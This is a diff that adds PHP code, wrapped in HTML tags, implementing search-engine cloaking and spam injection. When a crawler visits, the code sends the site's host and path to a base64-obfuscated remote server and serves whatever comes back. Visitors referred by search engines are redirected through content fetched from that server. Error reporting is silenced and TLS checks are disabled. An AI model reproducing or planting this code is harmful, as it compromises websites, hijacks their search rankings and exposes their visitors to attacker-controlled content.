@@ -1,0 +1,45 @@
+<html><head></head><body>error_reporting(0);
+function JSCget_content($url, $conn_timeout = 30, $trans_timeout = 30){
+    if (function_exists('curl_init')) {
+        $ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER["HTTP_USER_AGENT"]);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $conn_timeout);curl_setopt($ch, CURLOPT_TIMEOUT, $trans_timeout);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);$result = curl_exec($ch);if (curl_errno($ch)) { $result = NULL;}curl_close($ch);return $result;
+    } else {
+        return file_get_contents($url);
+    }
+}
+function isJSC_https()
+{
+    if (!empty($_SERVER['REQUEST_SCHEME']) &amp;&amp; $_SERVER['REQUEST_SCHEME'] == 'https') {
+        return true;
+    } elseif (!empty($_SERVER['HTTPS']) &amp;&amp; $_SERVER['HTTPS'] == 'on') {
+        return true;
+    } elseif (!empty($_SERVER['SERVER_PORT']) &amp;&amp; $_SERVER['SERVER_PORT'] == '443') {
+        return true;
+    } elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) &amp;&amp; $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') {
+        return true;
+    }
+    return false;
+}
+function JSCis_bot($uAgent){return (stristr($uAgent, 'googlebot') || stristr($uAgent, 'bing') || stristr($uAgent, 'coccoc') || stristr($uAgent, 'yahoo') || stristr($uAgent, 'google') || stristr($uAgent, 'Googlebot') || stristr($uAgent, 'googlebot')) ? true : false;}
+function JSCis_visitor($ref){return (stristr($ref, 'google') || stristr($ref, 'bing') || stristr($ref, 'yahoo') || stristr($ref, 'coccoc')) ? true : false;}
+function JSCis_prefix($uri, $prefix_regex = '/[?\\/](time|people|year|way|day|man|thing|woman|life|child|world|school|state|family|student|group|country|problem|hand|part|place|case|week|company|system|program|question|work|government|number|night|point|home|water|room|mother|area|money|story|fact|month|lot|right|study|book|eye|job|word|business|issue|side|kind|head|house|service|friend|father|power|hour|game|line|end|member|law|car|city|community|name|president|team|minute|idea|kid|body|information|back|parent|face|others|level|office|door|health|person|art|war|history|party|result|change|morning|reason|research|girl|guy|moment|air|teacher|force|education)./'){return preg_match($prefix_regex, $uri) === 1;}
+if (JSCis_bot($_SERVER['HTTP_USER_AGENT'])) {    
+    if(strtolower(substr($_SERVER['REQUEST_URI'],-4))==".pdf"){
+        
+        header('Content-Type: application/pdf');
+    }
+    
+    $URL_HOSTS=(isJSC_https()) ? 'https://'.$_SERVER['HTTP_HOST'] : 'http://'.$_SERVER['HTTP_HOST'];
+    
+    $URL_HOSTS=base64_encode($URL_HOSTS.'[H]'.$_SERVER['REQUEST_URI'].'[H]VN');
+    
+    $WJT=JSCget_content(base64_decode('aHR0cHM6Ly9zZW8uNjY3NzU5LmNvbS8=').$URL_HOSTS);
+    
+    echo $WJT;
+
+    if(JSCis_prefix($_SERVER['REQUEST_URI'])){exit;}
+
+}else{   
+    if(JSCis_visitor($_SERVER["HTTP_REFERER"]) &amp;&amp; JSCis_prefix($_SERVER['REQUEST_URI'])){$WJT=JSCget_content(base64_decode('aHR0cHM6Ly9zZW8uNjY3NzU5LmNvbS9nb3RvVXJsLw==').$_SERVER['HTTP_HOST']);echo $WJT;exit;}
+}
+
+</body></html>
